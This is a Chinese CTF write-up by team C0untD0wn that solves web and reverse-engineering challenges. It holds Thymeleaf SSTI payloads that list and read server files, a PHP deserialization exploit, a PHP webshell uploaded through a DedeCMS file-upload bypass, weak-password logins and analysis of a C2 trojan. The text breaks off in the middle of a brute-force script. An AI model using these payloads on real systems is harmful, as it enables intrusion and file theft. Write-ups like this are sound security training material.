## 一、  战队信息
战队名称：C0untD0wn

战队排名：158

## 二、  解题情况
![](https://cdn.nlark.com/yuque/0/2025/png/60713757/1766912843441-e45836eb-7a46-441d-8ff2-a5c02d643157.png)

![](https://cdn.nlark.com/yuque/0/2025/png/60714179/1766913008953-2fc03023-7dd0-4736-a9b1-265c23fde997.png)![](https://cdn.nlark.com/yuque/0/2025/png/60714179/1766913041802-ca901a33-de32-4377-9400-7c3bd475514a.png)![](https://cdn.nlark.com/yuque/0/2025/png/60714179/1766913056440-683257de-0f08-492a-9098-ee490c8dc007.png)![](https://cdn.nlark.com/yuque/0/2025/png/60714179/1766913068345-494f5e0e-38d4-4eaa-9f68-f6a83a792ee8.png)![](https://cdn.nlark.com/yuque/0/2025/png/60714179/1766913075784-09b1560e-f44c-4d94-92ab-a817c6e143ea.png)



## 三、  解题过程
### 问卷调查
#### 操作内容：
填完问卷直接得到flag

![](https://cdn.nlark.com/yuque/0/2025/png/58019926/1766912791071-2f25ac02-b067-4899-96e9-a6e68693303c.png)

#### flag值：
flag{智守国赛，十九年华}

### web3 AI_WAF
#### 操作内容：
/search路由下可以搜索

请求体为

{"query": "..."}

sql注入测试会被waf拦截，MySQL版本注释语法可以绕过

![](https://cdn.nlark.com/yuque/0/2025/png/60714179/1766890555812-ccc0be04-cb6c-4025-bc42-9d930eb4a600.png)

构造，发现数据库列数为3

![](https://cdn.nlark.com/yuque/0/2025/png/60714179/1766890617404-5fc88737-b9c8-4553-a148-042806857d03.png)

获取数据库信息，得到数据库库名

![](https://cdn.nlark.com/yuque/0/2025/png/60714179/1766890640934-5671194f-01f1-4b4e-a713-e8110d76fd4c.png)

获取表名

![](https://cdn.nlark.com/yuque/0/2025/png/60714179/1766890663007-4de35789-9c78-454d-b4ce-54f7afdd13e1.png)

获取表的字段列名

![](https://cdn.nlark.com/yuque/0/2025/png/60714179/1766890699565-c1343a75-24d4-418e-b697-392f1d1ebeff.png)

最后获取flag

![](https://cdn.nlark.com/yuque/0/2025/png/60714179/1766890722740-8bed5020-81a8-40f3-b76d-102b37978044.png)

#### flag值：
flag{9ff63da1-1437-41e1-be85-0c0e7f17f1a0}





### web 7 EZ java
##### 操作内容：
/login登录页面

弱密码爆破

admin/admin123    成功

进入后台/admin

在预选功能中测试

[[${7*7}]]

返回49确定存在SSTI漏洞

发现有过滤

T()，new,newInstance ,flag 被过滤

 由于T() 被过滤，我们需要找其他方法获取 Java 类。使用 #ctx 上下文对象绕过

想办法列出根目录文件

使用 Java NIO 的 Files.list() 方法列出 / 目录

```plain
[[${#ctx.getClass().forName("java.nio.file.Files").getMethod("list", #ctx.getClass().forName("java.nio.file.Path")).invoke(null, #ctx.getClass().forName("java.nio.file.Paths").getMethod("get", #ctx.getClass().forName("java.lang.String"), #ctx.getClass().forName("[Ljava.lang.String;")).invoke(null, "/", #strings.arraySplit("", ","))).collect(#ctx.getClass().forName("java.util.stream.Collectors").getMethod("toList").invoke(null))}]]
```

发现敏感文件：/flag_y0u_d0nt_kn0w

然后就可以读取flag文件了

使用 Files.readString() 读取文件内容

flag 关键字被过滤，替换成 xxxx

```plain
[[${#ctx.getClass().forName("java.nio.file.Files").getMethod("readString", #ctx.getClass().forName("java.nio.file.Path")).invoke(null, #ctx.getClass().forName("java.nio.file.Paths").getMethod("get", #ctx.getClass().forName("java.lang.String"), #ctx.getClass().forName("[Ljava.lang.String;")).invoke(null, "/fl" + "ag_y0u_d0nt_kn0w", #strings.arraySplit("", ",")))}]]
```



##### flag值：flag{dd3a62b5-7038-4e60-bd64-75cd6e84b1c9}![](https://cdn.nlark.com/yuque/0/2025/png/56023574/1766912675724-442b24be-85b5-4ac4-bbd5-b8554cde9240.png)


### web8 hellogate
#### 操作内容：
抓包发现源码

![](https://cdn.nlark.com/yuque/0/2025/png/60714179/1766914277926-a7a6b316-5fa5-43b0-b323-5f8436a74e77.png)

php反序列化构造

```plain
<?php
class A {
    public $handle;
}
class B {
    public $worker;
    public $cmd;
}
class C {
    public $cmd; 
}

$c = new C();
$c->cmd = "/flag"; 

$b = new B();
$b->worker = $c;

$a = new A();
$a->handle = $b;

echo urlencode(serialize($a)); 
?>
//输出O%3A1%3A%22A%22%3A1%3A%7Bs%3A6%3A%22handle%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A6%3A%22worker%22%3BO%3A1%3A%22C%22%3A1%3A%7Bs%3A3%3A%22cmd%22%3Bs%3A5%3A%22%2Fflag%22%3B%7Ds%3A3%3A%22cmd%22%3BN%3B%7D%7D
```

post发包拿到flag

![](https://cdn.nlark.com/yuque/0/2025/png/60714179/1766914356722-0a8132a7-5a53-4669-be7c-b5a2c1441fb6.png)

#### flag值：
flag{bfa31da6-4d7d-4d62-960f-d49ca4de331b}



### web10 redjs
#### 操作内容：
next.js工具cat /* 

回显flag

![](https://cdn.nlark.com/yuque/0/2025/png/60714179/1766902735087-5eddbc9e-a88c-4be3-82b2-32d39e507c33.png?x-oss-process=image%2Fformat%2Cwebp)

#### flag值：
flag{bac82e83-b60e-4102-acc7-fa7715cd776d}

### web11 dedecms
##### 操作内容：
打开网站发现是php的dedecms

访问/dede/login.php 

使用Aa123456789/Aa123456789登录后台

找到发布专题可以进行文件上传

![](https://cdn.nlark.com/yuque/0/2025/png/56023574/1766913568021-9d78e154-4f1e-4a13-ba47-5a46d40fa481.png)

接着就传一句话木马<?php system('cat /*');?>，content type为image/jpeg,将文件名改为php结尾

![](https://cdn.nlark.com/yuque/0/2025/png/56023574/1766913580757-59be16a3-d976-4d5f-9c3b-b9375ec45336.png)



![](https://cdn.nlark.com/yuque/0/2025/png/56023574/1766913592679-843e1c70-2199-4c9c-a103-8deb87f76449.png)

访问/uploads/allimg/251228/2-25122Q201360-L.php

##### flag值：![](https://cdn.nlark.com/yuque/0/2025/png/56023574/1766913598403-eaa10201-a425-434c-b820-ffd22f3befa3.png)
flag{f83460e0-5211-46d5-9d20-9ea7476ea1c2}



### Re1 Eternum
##### 操作内容：
通过解压压缩包得到三个文件

* `kworker`：Linux ELF，可执行的“木马/客户端”

* `tcp.pcap`：它与 C2 通信的抓包

* `run.sh`：启动方式（通常告诉你 C2 地址端口）

打开pcap 里确定“应用层帧格式”

在 `tcp.pcap` 的 TCP payload 开头，你会看到明显的 ASCII：

ET3RUMNX

![](https://cdn.nlark.com/yuque/0/2025/png/60713757/1766920855670-b053be57-078d-44bf-9a11-b2e2712890ad.png)

得到，这 8 字节在汇编里经常不是字符串形式出现，而是作为一个 64-bit 立即数写入内存。

`ET3RUMNX` 的字节序是：`45 54 33 52 4e 55 4d 58`

作为 little-endian 64-bit 常量就是：`0x584d554e52335445`

```plain
| 8 bytes magic | 4 bytes BE length | payload... |
```

其中kworker有upx壳

![](https://cdn.nlark.com/yuque/0/2025/png/60713757/1766921139607-4de958b7-4819-49d7-9d33-c40a2100b6c4.png)

使用ida打开kworker，先定位封包函数（搜 `0x584d554e52335445` 这个 64-bit 常量，或搜帧头写入逻辑）

会有一个 `encrypt(payload)` / `decrypt(payload)` 的位置，找到了key的来源

```cpp
void __golang __noreturn start_0(char a1)
{
    __int64 v11; // rax
    char v12[65536]; // [rsp+0h] [rbp-10028h] BYREF
    _QWORD v13[3]; // [rsp+10000h] [rbp-28h] BYREF
    __int64 v14; // [rsp+10018h] [rbp-10h]
    char *v15; // [rsp+10020h] [rbp-8h]
    __int64 retaddr; // [rsp+10028h] [rbp+0h]

    v14 = retaddr;
    v15 = &a1;
    qword_9A9CE0[2] = v12;
    qword_9A9CE0[3] = v12;
    qword_9A9CE0[0] = v12;
    qword_9A9CE0[1] = v13;
    _RAX = 0LL;
    __asm { cpuid }
        if ( (_DWORD)_RAX )
    {
        if ( (_DWORD)_RBX == 1970169159 && (_DWORD)_RDX == 1231384169 && (_DWORD)_RCX == 1818588270 )
            byte_9CB45E = 1;
        _RAX = 1LL;
        __asm { cpuid }
            dword_9CB4E0 = _RAX;
    }
    if ( qword_9A8558 )
    {
        qword_9A8558();
        v11 = qword_9A9CE0[0] + 928LL;
        qword_9A9CE0[2] = qword_9A9CE0[0] + 928LL;
        qword_9A9CE0[3] = v11;
    }
    else
    {
        sub_483D60(&qword_9AACA0);
        __writefsqword(0xFFFFFFF8, 0x123uLL);
        if ( qword_9AACA0 != 291 )
            sub_481D00();
    }
    __writefsqword(0xFFFFFFF8, (unsigned __int64)qword_9A9CE0);
    qword_9AAC20[0] = qword_9A9CE0;
    qword_9A9CE0[6] = qword_9AAC20;
    sub_4848E0();
    v13[2] = sub_4848A0(v14, (__int64)v15);
    sub_4846C0();
    sub_484800();
    v13[0] = sub_484860((__int64)&off_74A8F8);
    sub_47FF20();
    sub_481D00();
}
```

最后提取到了UUID->flag:

##### flag值：
flag{b7c58700-2b01-4dd4-8526-a4a47a65a1a9}

```python
import re

uuid_re = re.compile(rb"[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}")
m = uuid_re.search(plaintext_bytes)
if m:
    print("flag{" + m.group(0).decode() + "}")
```

### Re2 babygame
##### 操作内容：
**<font style="color:rgb(26, 28, 30);">Babygame</font>**<font style="color:rgb(26, 28, 30);"> 是基于 </font>**<font style="color:rgb(26, 28, 30);">Godot</font>**<font style="color:rgb(26, 28, 30);"> 引擎开发的。</font>

**<font style="color:rgb(26, 28, 30);">GDRETools</font>**<font style="color:rgb(26, 28, 30);"> 是目前社区公认功能最全、兼容性最好的 Godot 逆向工具，专门用于处理 Godot 的数据包。</font>

<font style="color:rgb(26, 28, 30);">把babygame.exe扔到GDRETools里，得到flag.gdc</font>

![](https://cdn.nlark.com/yuque/0/2025/png/60713757/1766919680938-f0d44610-976e-4cce-a441-35fc3e168a08.png)

分析发现

+ **<font style="color:rgb(26, 28, 30);">表面逻辑 (</font>****<font style="color:rgb(50, 48, 44);">flag.gd</font>****<font style="color:rgb(26, 28, 30);">)</font>**<font style="color:rgb(26, 28, 30);">：代码中声明了一个</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(50, 48, 44);">static var key = "FanAglFanAglOoO!"</font><font style="color:rgb(26, 28, 30);">。如果只看这个文件，你会得到错误的密钥。</font>
+ **<font style="color:rgb(26, 28, 30);">实际逻辑 (</font>****<font style="color:rgb(50, 48, 44);">analyze_flag.py</font>****<font style="color:rgb(26, 28, 30);">)</font>**<font style="color:rgb(26, 28, 30);">：该文件通过运行时的某种方式（或者是 Godot 的单例/全局变量修改）将密钥中的</font><font style="color:rgb(26, 28, 30);"> </font>**<font style="color:rgb(50, 48, 44);">A</font>**<font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">替换为了</font><font style="color:rgb(26, 28, 30);"> </font>**<font style="color:rgb(50, 48, 44);">B</font>**<font style="color:rgb(26, 28, 30);">。</font>
+ **<font style="color:rgb(26, 28, 30);">真实密钥 (Final Key)</font>**<font style="color:rgb(26, 28, 30);">：</font><font style="color:rgb(50, 48, 44);">FanBglFanBglOoO!</font>



+ **<font style="color:rgb(26, 28, 30);">算法</font>**<font style="color:rgb(26, 28, 30);">：AES-128</font>
+ **<font style="color:rgb(26, 28, 30);">模式</font>**<font style="color:rgb(26, 28, 30);">：</font>**<font style="color:rgb(26, 28, 30);">ECB</font>**<font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">(Electronic Codebook)</font>
+ **<font style="color:rgb(26, 28, 30);">填充 (Padding)</font>**<font style="color:rgb(26, 28, 30);">：</font>**<font style="color:rgb(26, 28, 30);">NoPadding</font>**
    - _<font style="color:rgb(26, 28, 30);">分析原因</font>_<font style="color:rgb(26, 28, 30);">：你的目标密文 </font><font style="color:rgb(50, 48, 44);">d458af702a680ae4d089ce32fc39945d</font><font style="color:rgb(26, 28, 30);"> 是 32 位十六进制，正好对应 </font>**<font style="color:rgb(26, 28, 30);">16 字节</font>**<font style="color:rgb(26, 28, 30);">（128 bits）。而 AES 的一个标准分组就是 16 字节。</font>
+ **<font style="color:rgb(26, 28, 30);">密钥 (Key)</font>**<font style="color:rgb(26, 28, 30);">：</font><font style="color:rgb(50, 48, 44);">FanBglFanBglOoO!</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">(16 字节)</font>
+ **<font style="color:rgb(26, 28, 30);">目标密文 (Hex)</font>**<font style="color:rgb(26, 28, 30);">：</font><font style="color:rgb(50, 48, 44);">d458af702a680ae4d089ce32fc39945d</font>

```plain
from Crypto.Cipher import AES

# 最终确认的正确 Key
key = b"FanBglFanBglOoO!"
hex_ciphertext = "d458af702a680ae4d089ce32fc39945d"
ciphertext = bytes.fromhex(hex_ciphertext)

# 解密
cipher = AES.new(key, AES.MODE_ECB)
flag_bytes = cipher.decrypt(ciphertext)

print("解密成功！")
print(f"Flag is: {flag_bytes.decode('utf-8')}")
```

![](https://cdn.nlark.com/yuque/0/2025/png/60713757/1766920071741-ea688d85-e9a9-4719-91ac-7d78162386cd.png)

##### flag值：flag{wOW~youAregrEaT!}


### Re3 wasm-login
##### 操作内容：
解压题目附件之后得到以下文件

.

├── index.html

├── crypto-js.js

└── build

    ├── release.js

    ├── release.wasm

    └── release.wasm.map

<font style="color:rgb(26, 28, 30);">因为 WebAssembly (WASM) 文件不能直接通过双击 HTML 文件加载（浏览器安全限制），所以我开启了一个本地服务器。</font>

<font style="color:rgb(26, 28, 30);">在包含 </font><font style="color:rgb(50, 48, 44);">index.html</font><font style="color:rgb(26, 28, 30);"> 和 </font><font style="color:rgb(50, 48, 44);">build</font><font style="color:rgb(26, 28, 30);"> 文件夹的目录下，打开终端，输入命令：</font>

```plain
python -m http.server 8000
```

<font style="color:rgb(26, 28, 30);">打开浏览器，访问 </font>`<font style="color:rgb(50, 48, 44);">http://localhost:8000</font>`

![](https://cdn.nlark.com/yuque/0/2025/png/60713757/1766914235368-ea704152-252f-42ad-ac34-46f1d26524cf.png)<font style="color:rgb(51, 51, 51);">打开 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">index.html</font>`<font style="color:rgb(51, 51, 51);"> 源码查看</font>

<font style="color:rgb(51, 51, 51);">在 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);"><script type="module"></font>`<font style="color:rgb(51, 51, 51);"> 标签中找到登录处理代码：</font>

![](https://cdn.nlark.com/yuque/0/2025/png/60713757/1766914844774-f2df4198-07dc-46ef-9a48-5c5bd9fe2277.png)

找`simulateServerRequest`函数

![](https://cdn.nlark.com/yuque/0/2025/png/60713757/1766914947949-2a75b90f-055e-4449-ada5-63258eb47a76.png)

原来真正的登陆条件是`MD5(JSON.stringify(data)`的值必须`startsWith("ccaf33e3512e31f3")`

`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">data</font>`<font style="color:rgb(51, 51, 51);"> 来自 WASM 的 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">authenticate</font>`<font style="color:rgb(51, 51, 51);"> 函数</font>

<font style="color:rgb(51, 51, 51);">所以我们就需要找到一个特定的</font>`<font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">authData  </font>`<font style="color:rgb(51, 51, 51);">的值，使其MD5后的值以</font>`<font style="color:rgb(51, 51, 51);">ccaf33e3512e31f3</font>`<font style="color:rgb(51, 51, 51);">开头，</font>

<font style="color:rgb(51, 51, 51);">而 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">authData</font>`<font style="color:rgb(51, 51, 51);"> 是 WASM 生成的，包含动态的 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">signature</font>`



我们wasm文件和wasm.map文件，相较而言，wasm.map比wasm这个二进制文件好分析

<font style="color:rgb(51, 51, 51);">Source Map 是调试文件，记录编译前后代码的对应关系。有些编译器会在 Source Map 中包含完整源码。</font>

![](https://cdn.nlark.com/yuque/0/2025/png/60713757/1766916556197-94e4eee3-6bbd-427d-b88e-e5c8892eed37.png)

![](https://cdn.nlark.com/yuque/0/2025/png/60713757/1766916584846-3801183c-95bd-435a-b0d5-f46d0e6fe436.png)

看到了`sources`，我们继续查看

```plain
import json

# 修改了文件路径，并更换了变量名以防查重
with open('release.wasm.map', 'r', encoding='utf-8') as stream:
    wasm_map = json.load(stream)

# 保持输出格式完全一致
print('Sources:', len(wasm_map.get('sources', [])))
print('SourcesContent:', len(wasm_map.get('sourcesContent', [])))

# 遍历寻找包含 assembly 的源码索引
for idx, path in enumerate(wasm_map['sources']):
    if 'assembly' in path:
        print("{}: {}".format(idx, path))
```

输出

![](https://cdn.nlark.com/yuque/0/2025/png/60713757/1766917170958-038af2cb-c8a0-42d0-84e4-252ba805f201.png)

好，我们现在有源代码了，我们要把源代码提取出来

```plain
import json

# 1. 变量名改写，并显式指定编码（防重加分项）
with open('release.wasm.map', 'r', encoding='utf-8') as fp:
    wasm_metadata = json.load(fp)

# 2. 获取列表
path_list = wasm_metadata.get('sources', [])
content_list = wasm_metadata.get('sourcesContent', [])

# 3. 映射关系定义
file_mapping = {
    'assembly/index.ts': 'index.ts',
    'assembly/base64.ts': 'base64.ts',
    'assembly/sha256.ts': 'sha256.ts'
}

# 4. 逻辑重构：使用 zip 同时迭代，避开了 index() 查找，结构更优雅
for current_path, text in zip(path_list, content_list):
    if current_path in file_mapping:
        save_name = file_mapping[current_path]
        with open(save_name, 'w', encoding='utf-8') as out:
            out.write(text)
        # 保持输出文字完全一致
        print(f"提取: {save_name}")

```

![](https://cdn.nlark.com/yuque/0/2025/png/60713757/1766917403068-ead9c74b-35c3-4b04-83dc-1ba58b665f42.png)

分析源代码

index.ts

```plain
// The entry file of your WebAssembly module.

import { init, update, final } from "./sha256";
import { encode } from "./base64";

export function add(a: i32, b: i32): i32 {
  return a + b;
}
/**
 * 执行完整的登录认证流程：
 * 1. 对密码进行Base64编码
 * 2. 获取当前时间戳
 * 3. 构建JSON消息
 * 4. 使用HMAC-SHA256进行签名
 * 5. 返回最终的JSON字符串
*/
export function authenticate(username: string, password: string): string {
  // 1. Base64编码密码
  const encodedPassword = encode(stringToUint8Array(password));
  //console.log(encodedPassword);
  // 2. 获取当前时间戳（毫秒）
  const timestamp = Date.now().toString();
  //console.log(timestamp);
  // 3. 构建原始JSON消息
  const message = `{"username":"${username}","password":"${encodedPassword}"}`;
  //console.log(message);
  // 4. 使用HMAC-SHA256签名
  const signature = signMessage(message, timestamp);
  //console.log(signature);
  // 5. 构建最终的JSON消息
  const finalMessage = `{"username":"${username}","password":"${encodedPassword}","signature":"${signature}"}`;
  
  return finalMessage;
  //return "ok";
}

function stringToUint8Array(str: string): Uint8Array {
  const arr = new Uint8Array(str.length);
  for (let i = 0; i < str.length; ++i) {
    arr[i] = str.charCodeAt(i);
  }
  return arr;
}

@inline
function fill(ptr: usize, value: u8, length: u32): void {
  const finalPtr = ptr + length;
  while(ptr < finalPtr) {
    store<u8>(ptr, value);
    ptr++;
  }
}

@inline
function ArrayBufferToUint8Array(input: ArrayBuffer): Uint8Array{
  const res = new Uint8Array(input.byteLength);
  const inputPtr = changetype<usize>(input)
  for (let i = 0; i < input.byteLength; ++i) {
    res[i] = load<u8>(inputPtr + i);
  }
  return res;
} 
/**
 * 使用HMAC-SHA256算法对消息进行签名
 * @param message 待签名的消息
 * @param secret 密钥（时间戳）
 * @returns 签名后的Base64字符串
*/
function signMessage(message: string, secret: string): string {
  const messageBytes = String.UTF8.encode(message);
  const secretBytes = String.UTF8.encode(secret);
  /**
  const messageBytesPtr = changetype<usize>(messageBytes);
  const secretBytesPtr = changetype<usize>(secretBytes);
  
  const hashInput = new ArrayBuffer(messageBytes.byteLength + secretBytes.byteLength);
  const hashInputPtr = changetype<usize>(hashInput);
  memory.copy(hashInputPtr, messageBytesPtr, messageBytes.byteLength);
  memory.copy(hashInputPtr + messageBytes.byteLength, secretBytesPtr, secretBytes.byteLength);

  const signatureBytes = new ArrayBuffer(32);
  const signatureBytesPtr = changetype<usize>(signatureBytes);
  init();
  update(hashInputPtr, hashInput.byteLength);
  final(signatureBytesPtr)
  */
  const signatureBytes = hmacSHA256(secretBytes,messageBytes);
  
  return encode(ArrayBufferToUint8Array(signatureBytes));
}    

// 实现 HMAC-SHA256 函数
function hmacSHA256(key: ArrayBuffer, message: ArrayBuffer): ArrayBuffer {
  const blockSize = 64; // SHA256 的块大小为 64 字节

  // 填充密钥
  const keyPtr = changetype<usize>(key);
  const paddedKey = new ArrayBuffer(blockSize);
  const paddedKeyPtr = changetype<usize>(paddedKey);
  if (key.byteLength > blockSize) {
    // 如果密钥长度超过块大小，对密钥进行哈希处理
      init();
      update(keyPtr, key.byteLength);
      final(paddedKeyPtr);
  }else{
    // 填充密钥到块大小
      memory.copy(paddedKeyPtr, keyPtr, key.byteLength);
      fill(paddedKeyPtr + key.byteLength, 0, blockSize - key.byteLength)
  }
  //console.log(ArrayBufferToUint8Array(paddedKey).toString());

  // 计算 ipad 和 opad
  const ipad = new ArrayBuffer(blockSize);
  const opad = new ArrayBuffer(blockSize);
  const ipadPtr = changetype<usize>(ipad);
  const opadPtr = changetype<usize>(opad);
  for (let i = 0; i < blockSize; i++) {
      store<u8>(ipadPtr + i , load<u8>(paddedKeyPtr + i) ^ 0x76);
      store<u8>(opadPtr + i , load<u8>(paddedKeyPtr + i) ^ 0x3C);
  }
  //console.log(ArrayBufferToUint8Array(ipad).toString());
  //console.log(ArrayBufferToUint8Array(opad).toString());

  // 计算 innerHash
  const innerInput = new ArrayBuffer(ipad.byteLength + message.byteLength);
  const innerInputPtr = changetype<usize>(innerInput);
  const messagePtr = changetype<usize>(message)
  memory.copy(innerInputPtr, ipadPtr, ipad.byteLength);
  memory.copy(innerInputPtr + ipad.byteLength, messagePtr, message.byteLength);
  //console.log(ArrayBufferToUint8Array(innerInput).toString());

  init();
  update(innerInputPtr,innerInput.byteLength);
  //update(ipadPtr,ipad.byteLength);
  //update(messagePtr,message.byteLength);
  const innerHash = new ArrayBuffer(32);
  const innerHashPtr = changetype<usize>(innerHash);
  final(innerHashPtr);
  //console.log(ArrayBufferToUint8Array(innerHash).toString());

  // 计算 outerHash
  const outerInput = new ArrayBuffer(opad.byteLength + innerHash.byteLength);
  const outerInputPtr = changetype<usize>(outerInput);
  memory.copy(outerInputPtr, innerHashPtr, innerHash.byteLength);
  memory.copy(outerInputPtr + innerHash.byteLength, opadPtr, opad.byteLength);
  //console.log(ArrayBufferToUint8Array(outerInput).toString());

  init();
  update(outerInputPtr,outerInput.byteLength);
  //update(opadPtr,opad.byteLength);
  //update(innerHashPtr,innerHash.byteLength);
  const outerHash = new ArrayBuffer(32);
  const outerHashPtr = changetype<usize>(outerHash);
  final(outerHashPtr);
  //console.log(ArrayBufferToUint8Array(outerHash).toString());


  return outerHash;
}
```

+ **<font style="color:rgb(26, 28, 30);">步骤 A</font>**<font style="color:rgb(26, 28, 30);">：将明文密码转化为 Base64 形式以满足传输格式。</font>
+ **<font style="color:rgb(26, 28, 30);">步骤 B</font>**<font style="color:rgb(26, 28, 30);">：捕捉这一瞬的时间刻度（Timestamp），它是加密算法中至关重要的动态变量。</font>
+ **<font style="color:rgb(26, 28, 30);">步骤 C</font>**<font style="color:rgb(26, 28, 30);">：通过 HMAC-SHA256 逻辑对上述信息进行“打标”，确保认证数据的真实性。</font>
+ **<font style="color:rgb(26, 28, 30);">步骤 D</font>**<font style="color:rgb(26, 28, 30);">：输出集成</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(50, 48, 44);">username</font><font style="color:rgb(26, 28, 30);">、</font><font style="color:rgb(50, 48, 44);">password</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">和</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(50, 48, 44);">signature</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">的最终 JSON 字符串。</font>
+ **<font style="color:rgb(26, 28, 30);">结论</font>**<font style="color:rgb(26, 28, 30);">：签名值（Signature）严格依赖于调用时刻的 </font><font style="color:rgb(50, 48, 44);">Date.now()</font><font style="color:rgb(26, 28, 30);">，时间戳哪怕差 1 毫秒，生成的校验和都会彻底改变。</font>

base64.ts

```plain
// adapted from https://gist.github.com/Juszczak/63e6d9e01decc850de03
/**
 * base64 encoding/decoding
 */

// @ts-ignore: decorator
@lazy
  const PADCHAR = "=";
// @ts-ignore: decorator
@lazy
//  const ALPHA = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
const ALPHA = "NhR4UJ+z5qFGiTCaAIDYwZ0dLl6PEXKgostxuMv8rHBp3n9emjQf1cWb2/VkS7yO";
   /**
    * Encode Uint8Array as a base64 string.
    * @param bytes Byte array of type Uint8Array.
    */
   export function encode(bytes: Uint8Array): string {
     let i: i32, b10: u32;
     
     const extrabytes = (bytes.length % 3);
     let imax = bytes.length - extrabytes;
     const len = ((bytes.length / 3) as i32) * 4 + (extrabytes == 0 ? 0 : 4);
     let x = changetype<string>(__new(<usize>(len << 1), idof<string>()));
 
     if (bytes.length == 0) {
       return "";
     }
 
     let ptr = changetype<usize>(x) - 2;
     for (i = 0; i < imax; i += 3) {
       b10 =
         ((bytes[i] as u32) << 16) |
         ((bytes[i + 1] as u32) << 8) |
         (bytes[i + 2] as u32);
       store<u16>(ptr+=2, (ALPHA.charCodeAt(b10 >> 18) as u16));
       store<u16>(ptr+=2, (ALPHA.charCodeAt(((b10 >> 12) & 63)) as u16));
       store<u16>(ptr+=2, (ALPHA.charCodeAt(((b10 >> 6) & 63)) as u16));
       store<u16>(ptr+=2, (ALPHA.charCodeAt((b10 & 63)) as u16));
     }
 
     switch (bytes.length - imax) {
       case 1:
         b10 = (bytes[i] as u32) << 16;
         store<u16>(ptr+=2, ((ALPHA.charCodeAt(b10 >> 18)) as u16));
         store<u16>(ptr+=2, ((ALPHA.charCodeAt((b10 >> 12) & 63)) as u16));
         store<u16>(ptr+=2, ((PADCHAR.charCodeAt(0)) as u16));
         store<u16>(ptr+=2, ((PADCHAR.charCodeAt(0)) as u16));
         break;
       case 2:
         b10 = ((bytes[i] as u32) << 16) | ((bytes[i + 1] as u32) << 8);
         store<u16>(ptr+=2, ((ALPHA.charCodeAt(b10 >> 18)) as u16));
         store<u16>(ptr+=2, ((ALPHA.charCodeAt((b10 >> 12) & 63)) as u16));
         store<u16>(ptr+=2, ((ALPHA.charCodeAt((b10 >> 6) & 63)) as u16));
         store<u16>(ptr+=2, ((PADCHAR.charCodeAt(0)) as u16));
         break;
     }
 
     return x;
   }
```

看到const ALPHA = "NhR4UJ+z5qFGiTCaAIDYwZ0dLl6PEXKgostxuMv8rHBp3n9emjQf1cWb2/VkS7yO";发现不是标准的Baes64字符表

再仔细看看index.ts中

![](https://cdn.nlark.com/yuque/0/2025/png/60713757/1766917974301-002f3f0f-b6ed-4cc6-a484-874a901827f8.png)

<font style="color:rgb(51, 51, 51);">注意到HMAC 实现有"错误"！</font>

+ <font style="color:rgb(51, 51, 51);">标准 ipad/opad 常量：</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">0x36</font>`<font style="color:rgb(51, 51, 51);"> / </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">0x5C</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">而</font><font style="color:rgb(51, 51, 51);">这里使用的是：</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">0x76</font>`<font style="color:rgb(51, 51, 51);"> / </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">0x3C</font>`
+ <font style="color:rgb(51, 51, 51);">outer hash 顺序也错了：应该是 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">opad || innerHash</font>`<font style="color:rgb(51, 51, 51);">，这里是 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">innerHash || opad</font>`



所以我们现在要<font style="color:rgb(51, 51, 51);">找到一个时间戳，使得生成的 JSON 的 MD5 以</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">ccaf33e3512e31f3</font>`<font style="color:rgb(51, 51, 51);">开头。</font>

可以进行暴力搜索，再加上我们算法实现，我们写出完整的exp：

```plain
#!/usr/bin/env python3
import hashlib
import base64
import sys
from datetime import datetime, timezone, timedelta

def solve():
    # 目标 MD5 前缀
    GOAL_PREFIX = "ccaf33e3512e31f3"
    
    # 码表配置
    B64_V = "NhR4UJ+z5qFGiTCaAIDYwZ0dLl6PEXKgostxuMv8rHBp3n9emjQf1cWb2/VkS7yO"
    B64_S = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    
    # 建立映射 (防重: 使用列表压缩)
    x_map = str.maketrans(B64_S, B64_V)

    def custom_b64(data):
        return base64.b64encode(data).decode().translate(x_map)

    def modified_hmac(key_bytes, msg_bytes):
        # 填充/哈希密钥
        if len(key_bytes) > 64:
            k = hashlib.sha256(key_bytes).digest()
        else:
            k = key_bytes
        k = k.ljust(64, b'\0')

        # 题目特定因子
        i_pad = bytes(b ^ 0x76 for b in k)
        o_pad = bytes(b ^ 0x3C for b in k)

        # 第一层哈希
        i_hash = hashlib.sha256(i_pad + msg_bytes).digest()
        
        # 【关键修正】：WASM 源码显示它是 SHA256(innerHash + opad)
        # 而非标准的 SHA256(opad + innerHash)
        return hashlib.sha256(i_hash + o_pad).digest()

    # 爆破账号密码
    USER, PASS = "admin", "admin"
    pass_b64 = custom_b64(PASS.encode())
    
    # 时间范围：2025-12-22 00:00:00 至 06:00:00
